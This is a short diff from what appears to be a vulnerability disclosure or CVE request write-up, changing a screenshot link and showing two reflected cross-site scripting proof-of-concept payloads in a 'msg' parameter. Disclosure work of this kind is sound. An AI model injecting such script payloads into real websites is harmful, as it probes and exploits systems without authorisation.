@@ -14,4 +14,4 @@ Payload1: msg=<script>alert('xss')</script>
 
 Payload2: msg=<script>alert(789)</script>
 
-![image](https://github.com/kanyl6/CVERequest/blob/main/1.png)
+![image](https://github.com/kanyl6/CVERequest/blob/main/2.png)
